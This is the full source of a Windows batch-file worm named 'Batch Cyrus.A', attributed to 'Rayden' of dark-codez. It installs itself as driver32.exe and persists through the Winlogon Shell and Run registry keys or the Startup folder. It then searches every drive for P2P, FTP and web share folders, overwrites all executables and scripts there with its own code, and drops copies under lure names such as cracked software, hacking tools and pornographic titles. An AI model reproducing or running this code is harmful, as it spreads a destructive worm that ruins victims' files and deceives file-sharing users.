:: **********************
:: *   Batch Cyrus.A    *
:: *   (c) by Rayden    *
:: **********************
:: * www.dark-codez.org *
:: **********************
@echo off
cd /d %appdata%
date %date% > nul
if %errorlevel% == 0 goto admin
if not %errorlevel% == 0 goto noadmin
:admin
set right=admin
set windows=%systemroot%
cd /d %windows%
if exist system32 goto make32
if not exist system32 goto make2000
:make32
set system=system32
cd %system%
goto param
:make2000
set system=system
cd %system%
goto param
:noadmin
set right=noadmin
set windows=%appdata%
set system=Windows
cd /d %windows%
if exist %system% goto appwin
md %system%
:appwin
cd %system%
goto param
:param
copy %0 driver32.exe > nul
if "%right%" == "admin" goto startup
if not "%right%" == "admin" goto noadminrun
:startup
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" > nul
if not %errorlevel% == 0 goto adminrun
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe %windows%\%system%\driver32.exe" /f > nul
if %errorlevel% == 0 goto openme
if not %errorlevel% == 0 goto adminrun
:adminrun
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "driver32" /t REG_SZ /d "%windows%\%system%\driver32.exe" /f > nul
if %errorlevel% == 0 goto openme
if not %errorlevel% == 0 goto noadminrun
:noadminrun
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "driver32" /t REG_SZ /d "%windows%\%system%\driver32.exe" /f > nul
if %errorlevel% == 0 goto openme
if not %errorlevel% == 0 goto autofolder
:autofolder
cd /d %myfiles%
copy change.exe "%windows%\%system%\change.exe" > nul
cd /d %windows%
cd %system%
for /f "tokens=2*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Startup') do set autopfad=%%B
if not %errorlevel% == 0 goto srchauto
echo %autopfad%>autopfad.txt
change autopfad.txt "Ä" ""
change autopfad.txt "Ö" "™"
change autopfad.txt "Ü" "š"
change autopfad.txt "ä" "„"
change autopfad.txt "ö" "”"
change autopfad.txt "ü" ""
set /p autorun=<autopfad.txt
copy %0 "%autorun%\activedesktop.exe" > nul
if not %errorlevel% == 0 goto srchauto
del /f /q autopfad.txt > nul
goto openme
:srchauto
cd /d %userprofile%
for /r /d %%a in (*start*) do copy %0 "%%a\activedesktop.exe" > nul
goto openme
:openme
cd /d %myfiles%
copy error.exe "%windows%\%system%\error.exe" > nul
cd /d %windows%
cd %system%
echo %0 | find /i "%windows%\%system%\driver32.exe" > nul
if %errorlevel% == 0 goto spread
if not %errorlevel% == 0 goto deskt
:deskt
echo %0 | find /i "activedesktop.exe" > nul
if %errorlevel% == 0 goto checkprog
if not %errorlevel% == 0 goto mg
:mg
start /max error.exe
goto checkprog
:checkprog
cd /d %systemroot%
if exist system32 set taskfold=system32 & goto whoproc
if not exist system32 set taskfold=system & goto whoproc
:whoproc
cd %taskfold%
if exist tasklist.exe set process=tasklist & goto findmyproc
if exist qprocess.exe set process=qprocess & goto findmyproc
if not exist qprocess.exe goto execme
:findmyproc
%process% | find /i "driver32.exe" > nul
if %errorlevel% == 0 exit
if not %errorlevel% == 0 goto execme
:execme
cd /d %windows%
cd %system%
start "driver32.exe" "%windows%\%system%\driver32.exe"
exit
:spread
if exist "%windows%\%system%\drives.txt" del /f /q "%windows%\%system%\drives.txt" > nul
if exist "%windows%\%system%\drives2.txt" del /f /q "%windows%\%system%\drives2.txt" > nul
if exist "%windows%\%system%\temp.txt" del /f /q "%windows%\%system%\temp.txt" > nul
if exist "%windows%\%system%\temp1.txt" del /f /q "%windows%\%system%\temp1.txt" > nul
if exist "%windows%\%system%\temp2.txt" del /f /q "%windows%\%system%\temp2.txt" > nul
set A=0
set B=0
for %%a in (C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) do if exist "%%a" echo %%a>>"%windows%\%system%\drives.txt"
echo xXEndofDrivesXx>>"%windows%\%system%\drives.txt"
set /p spreaddrive=<"%windows%\%system%\drives.txt"
goto foldersearch
:nextdr
set /a B=B+1
more /e /p +%B% "%windows%\%system%\drives.txt">"%windows%\%system%\drives2.txt"
set /p spreaddrive=<"%windows%\%system%\drives2.txt"
if "%spreaddrive%" == "xXEndofDrivesXx" goto copyshar
goto foldersearch
:foldersearch
cd /d %spreaddrive%\
if "%right%" == "admin" goto lwcopy
if not "%right%" == "admin" goto searchp2p
:lwcopy
copy %0 pics.exe > nul
if %errorlevel% == 0 goto searchp2p
if not %errorlevel% == 0 goto nextdr
:searchp2p
for /r /d %%a in (*shar*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*shar*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*download*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*download*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*upload*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*upload*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*incoming*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*incoming*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*grokster*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*grokster*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*imesh*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*imesh*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*tesla*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*tesla*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*icq*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*icq*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*ftp*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*ftp*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*http*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*http*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*htdocs*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*htdocs*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*receiv*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*receiv*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
for /r /d %%a in (*freig*) do echo %%a>>"%windows%\%system%\temp.txt"
for /r /d %%b in (*freig*) do dir /ad /s /b "%%b">>"%windows%\%system%\temp.txt"
goto nextdr
:copyshar
cd /d %windows%
cd %system%
del /f /q drives.txt > nul
del /f /q drives2.txt > nul
sort temp.txt >> temp1.txt
echo xXEndoffolderXx>>"%windows%\%system%\temp1.txt"
del /f /q temp.txt > nul
set /p kaz=<"%windows%\%system%\temp1.txt"
goto cyrus
:next
set /a A=A+1
more /e /p +%A% "%windows%\%system%\temp1.txt">"%windows%\%system%\temp2.txt"
set /p kaz=<"%windows%\%system%\temp2.txt"
if "%kaz%" == "xXEndoffolderXx" goto end
goto cyrus
:cyrus
copy %0 "%kaz%\Microsoft Visual C++ 6.0.exe" > nul
if not %errorlevel% == 0 goto next
for %%a in ("%kaz%\*.exe") do copy %0 "%%a" > nul
for %%a in ("%kaz%\*.scr") do copy %0 "%%a" > nul
for %%a in ("%kaz%\*.com") do copy %0 "%%a" > nul
for %%a in ("%kaz%\*.pif") do copy %0 "%%a" > nul
for %%a in ("%kaz%\*.bat") do copy %0 "%%a" > nul
for %%a in ("%kaz%\*.cmd") do copy %0 "%%a" > nul
copy %0 "%kaz%\Keygen for all Microsoft Windows Products.exe" > nul
copy %0 "%kaz%\Microsoft Office Basic 2008.exe" > nul
copy %0 "%kaz%\Microsoft Office Basic Edition 2003.exe" > nul
copy %0 "%kaz%\Microsoft Office Home and Student 2008.exe" > nul
copy %0 "%kaz%\Microsoft Office Professional 2003.exe" > nul
copy %0 "%kaz%\Microsoft Office Professional 2008.exe" > nul
copy %0 "%kaz%\Microsoft Office Small Business 2003.exe" > nul
copy %0 "%kaz%\Microsoft Office Small Business 2008.exe" > nul
copy %0 "%kaz%\Microsoft Office Standard 2003.exe" > nul
copy %0 "%kaz%\Microsoft Office Standard 2008.exe" > nul
copy %0 "%kaz%\Microsoft Office Student and Teacher 2003.exe" > nul
copy %0 "%kaz%\Microsoft Office Ultimate 2008.exe" > nul
copy %0 "%kaz%\Microsoft Visual Basic 6.0.exe" > nul
copy %0 "%kaz%\Microsoft Visual Studio 6.0.exe" > nul
copy %0 "%kaz%\Microsoft Windows Serials.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Service Pack 1.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Service Pack 2.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Service Pack 3.exe" > nul
copy %0 "%kaz%\Microsoft Windows Update Pack %date%.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Business.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Enterprise.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Home Basic.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Home Premium.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Ultimate.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Home.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Professional.exe" > nul
copy %0 "%kaz%\Microsoft Windows Home Server.exe" > nul
copy %0 "%kaz%\Microsoft Windows Server 2003.exe" > nul
copy %0 "%kaz%\Microsoft Windows Server 2008.exe" > nul
copy %0 "%kaz%\Microsoft Windows 7.exe" > nul
copy %0 "%kaz%\Microsoft Windows Media Center Edition.exe" > nul
copy %0 "%kaz%\3D Gamestudio.exe" > nul
copy %0 "%kaz%\Acronis True Image 11.exe" > nul
copy %0 "%kaz%\Pinnacle Studio Version 11.exe" > nul
copy %0 "%kaz%\Adobe Photoshop CS3.exe" > nul
copy %0 "%kaz%\Adobe Photoshop Keygen.exe" > nul
copy %0 "%kaz%\Ahead Nero Premium.exe" > nul
copy %0 "%kaz%\Music Maker 2008 XXL.exe" > nul
copy %0 "%kaz%\Avira Antivir Premium.exe" > nul
copy %0 "%kaz%\Camtasia Studio.exe" > nul
copy %0 "%kaz%\Clone CD.exe" > nul
copy %0 "%kaz%\Clone DVD.exe" > nul
copy %0 "%kaz%\DRM Crack.exe" > nul
copy %0 "%kaz%\DVD Ripper.exe" > nul
copy %0 "%kaz%\Gamemaker.exe" > nul
copy %0 "%kaz%\Kaspersky Antivirus.exe" > nul
copy %0 "%kaz%\Kaspersky Internet Security.exe" > nul
copy %0 "%kaz%\All Formats Converter.exe" > nul
copy %0 "%kaz%\NOD32 Antivirus.exe" > nul
copy %0 "%kaz%\Symantec Norton Antivirus 2008.exe" > nul
copy %0 "%kaz%\Symantec Norton Ghost 10.exe" > nul
copy %0 "%kaz%\Partition Magic.exe" > nul
copy %0 "%kaz%\Power DVD.exe" > nul
copy %0 "%kaz%\Tune Up Utilities 2008.exe" > nul
copy %0 "%kaz%\Ulead Gif Animator.exe" > nul
copy %0 "%kaz%\Virtual PC 2008.exe" > nul
copy %0 "%kaz%\VMWare Workstation.exe" > nul
copy %0 "%kaz%\Winamp.exe" > nul
copy %0 "%kaz%\James Bond Casino Royale.exe" > nul
copy %0 "%kaz%\The Matrix.exe" > nul
copy %0 "%kaz%\The Matrix Reloaded.exe" > nul
copy %0 "%kaz%\The Matrix Revolutions.exe" > nul
copy %0 "%kaz%\Spiderman 3.exe" > nul
copy %0 "%kaz%\Star Wars Episode 1.exe" > nul
copy %0 "%kaz%\Star Wars Episode 2.exe" > nul
copy %0 "%kaz%\Star Wars Episode 3.exe" > nul
copy %0 "%kaz%\Star Wars Episode 4.exe" > nul
copy %0 "%kaz%\Star Wars Episode 5.exe" > nul
copy %0 "%kaz%\Star Wars Episode 6.exe" > nul
copy %0 "%kaz%\Die Hard 4 0 English.exe" > nul
copy %0 "%kaz%\Stirb langsam 4 Deutsch.exe" > nul
copy %0 "%kaz%\Simpsons Der Film Deutsch.exe" > nul
copy %0 "%kaz%\Simpsons the Movie English.exe" > nul
copy %0 "%kaz%\Bioshock.exe" > nul
copy %0 "%kaz%\Call of Duty 3.exe" > nul
copy %0 "%kaz%\Counterstrike.exe" > nul
copy %0 "%kaz%\Counterstrike MapHack.exe" > nul
copy %0 "%kaz%\Counterstrike Source.exe" > nul
copy %0 "%kaz%\Fifa Football 2008.exe" > nul
copy %0 "%kaz%\Fifa Manager 2008.exe" > nul
copy %0 "%kaz%\GTA Add-ons collection.exe" > nul
copy %0 "%kaz%\GTA San Andreas Hot Coffee Patch.exe" > nul
copy %0 "%kaz%\GTA Liberty City Stories.exe" > nul
copy %0 "%kaz%\GTA San Andreas.exe" > nul
copy %0 "%kaz%\GTA Vice City.exe" > nul
copy %0 "%kaz%\GTA Vice City Stories.exe" > nul
copy %0 "%kaz%\GTA IV.exe" > nul
copy %0 "%kaz%\Need for Speed Carbon.exe" > nul
copy %0 "%kaz%\Need for Speed Pro Street.exe" > nul
copy %0 "%kaz%\World of Warcraft.exe" > nul
copy %0 "%kaz%\Half-Life Episode Two.exe" > nul
copy %0 "%kaz%\Quake 4.exe" > nul
copy %0 "%kaz%\Allround Password Stealer.exe" > nul
copy %0 "%kaz%\Brutus Password Cracker.exe" > nul
copy %0 "%kaz%\Chat Flooder.exe" > nul
copy %0 "%kaz%\Credit Card Generator.exe" > nul
copy %0 "%kaz%\Email Account Hacker.exe" > nul
copy %0 "%kaz%\Exploit Collection.exe" > nul
copy %0 "%kaz%\Fakemailer.exe" > nul
copy %0 "%kaz%\FTP Cracker.exe" > nul
copy %0 "%kaz%\Hackers Black Book.exe" > nul
copy %0 "%kaz%\Hackertools Collection.exe" > nul
copy %0 "%kaz%\Hotmail Hacker.exe" > nul
copy %0 "%kaz%\ICQ Flooder.exe" > nul
copy %0 "%kaz%\ICQ Hacker.exe" > nul
copy %0 "%kaz%\ICQ Passwordstealer.exe" > nul
copy %0 "%kaz%\All Instant Messenger Passwordstealer.exe" > nul
copy %0 "%kaz%\JPEG Downloader.exe" > nul
copy %0 "%kaz%\Elite Keylogger.exe" > nul
copy %0 "%kaz%\KGB Spy Builder.exe" > nul
copy %0 "%kaz%\Massmailer.exe" > nul
copy %0 "%kaz%\Master Card Generator.exe" > nul
copy %0 "%kaz%\Hash Cracker.exe" > nul
copy %0 "%kaz%\MSN Hacker.exe" > nul
copy %0 "%kaz%\Paypal Faker.exe" > nul
copy %0 "%kaz%\Paypal Hacker.exe" > nul
copy %0 "%kaz%\PHP SQL Injector.exe" > nul
copy %0 "%kaz%\ProRAT 2.0.exe" > nul
copy %0 "%kaz%\Rapidshare Unlimited Loader.exe" > nul
copy %0 "%kaz%\Rapidshare Premium Account Generator.exe" > nul
copy %0 "%kaz%\Superscan.exe" > nul
copy %0 "%kaz%\Teamspeak Hacker.exe" > nul
copy %0 "%kaz%\Trojan Generator.exe" > nul
copy %0 "%kaz%\Virus Generator.exe" > nul
copy %0 "%kaz%\Visa Card Generator.exe" > nul
copy %0 "%kaz%\Webcam Spy.exe" > nul
copy %0 "%kaz%\Website Defacer.exe" > nul
copy %0 "%kaz%\Website Hacktool.exe" > nul
copy %0 "%kaz%\Website Passwordcracker.exe" > nul
copy %0 "%kaz%\Windows Rootkit.exe" > nul
copy %0 "%kaz%\Big Wordlist.exe" > nul
copy %0 "%kaz%\Worm Generator.exe" > nul
copy %0 "%kaz%\wwwHack.exe" > nul
copy %0 "%kaz%\Invisible IP.exe" > nul
copy %0 "%kaz%\Winrar Password Recovery.exe" > nul
copy %0 "%kaz%\Phishing Generator.exe" > nul
copy %0 "%kaz%\mPack.exe" > nul
copy %0 "%kaz%\IcePack Platinum.exe" > nul
copy %0 "%kaz%\Amateur Porn.exe" > nul
copy %0 "%kaz%\Anal Fisting.exe" > nul
copy %0 "%kaz%\Anal Fuck.exe" > nul
copy %0 "%kaz%\Geiler Arschfick.exe" > nul
copy %0 "%kaz%\Dirty Hardcore Porn.exe" > nul
copy %0 "%kaz%\Blowjob.exe" > nul
copy %0 "%kaz%\Britney Spears Sex Tape.exe" > nul
copy %0 "%kaz%\Carmen Electra Sex Tape.exe" > nul
copy %0 "%kaz%\Paris Hilton Sex Tape.exe" > nul
copy %0 "%kaz%\Cumshot.exe" > nul
copy %0 "%kaz%\Eroticgirls.exe" > nul
copy %0 "%kaz%\Double Penetration.exe" > nul
copy %0 "%kaz%\Triple Penetration.exe" > nul
copy %0 "%kaz%\Gangbang.exe" > nul
copy %0 "%kaz%\Hardcore Porn.exe" > nul
copy %0 "%kaz%\Hot Porno.exe" > nul
copy %0 "%kaz%\Kamasutra.exe" > nul
copy %0 "%kaz%\Lesbian Girls.exe" > nul
copy %0 "%kaz%\Porno.exe" > nul
copy %0 "%kaz%\Porno Screensaver.scr" > nul
copy %0 "%kaz%\Porno sex oral anal cool awesome!!.exe" > nul
copy %0 "%kaz%\Sado Maso Sex.exe" > nul
copy %0 "%kaz%\XXX Hardcore Images.exe" > nul
copy %0 "%kaz%\sex sex sex sex sex sex.exe" > nul
copy %0 "%kaz%\Schoolgirl Fuck.exe" > nul
copy %0 "%kaz%\Ass to Mouth Porn.exe" > nul
copy %0 "%kaz%\Teen Porn.exe" > nul
copy %0 "%kaz%\XXX and more.exe" > nul
copy %0 "%kaz%\Young Girl getting fucked.exe" > nul
copy %0 "%kaz%\Cyrus Sourcecode.exe" > nul
copy %0 "%kaz%\Storm Worm Sourcecode.exe" > nul
copy %0 "%kaz%\Microsoft Windows Vista Sourcecode.exe" > nul
copy %0 "%kaz%\Microsoft Windows XP Sourcecode.exe" > nul
copy %0 "%kaz%\Allround SIM-Lock Removal Tool.exe" > nul
copy %0 "%kaz%\Audio Codec Pack.exe" > nul
copy %0 "%kaz%\Cracks Archive.exe" > nul
copy %0 "%kaz%\K-Lite Mega Codec Pack.exe" > nul
copy %0 "%kaz%\Real Credit Cards.exe" > nul
copy %0 "%kaz%\Serials Archive.exe" > nul
copy %0 "%kaz%\Video Codec Pack.exe" > nul
copy %0 "%kaz%\Warez Archive.exe" > nul
copy %0 "%kaz%\Windows Genuine Removal Tool.exe" > nul
copy %0 "%kaz%\Windows Vista Original Maker.exe" > nul
copy %0 "%kaz%\Windows XP Original Maker.exe" > nul
copy %0 "%kaz%\Matrix Screensaver.scr" > nul
copy %0 "%kaz%\Accounts.exe" > nul
copy %0 "%kaz%\Harry Potter 1-7 e book Deutsch.exe" > nul
copy %0 "%kaz%\Harry Potter all e book.exe" > nul
copy %0 "%kaz%\Harry Potter Game.exe" > nul
copy %0 "%kaz%\Harry Potter.exe" > nul
copy %0 "%kaz%\Rapidshare Premium Accounts.exe" > nul
ping -n 2 127.0.0.1 > nul
goto next
:end
cd /d %windows%
cd %system%
if exist drives.txt del /f /q drives.txt > nul
if exist drives2.txt del /f /q drives2.txt > nul
if exist temp.txt del /f /q temp.txt > nul
if exist temp1.txt del /f /q temp1.txt > nul
if exist temp2.txt del /f /q temp2.txt > nul
exit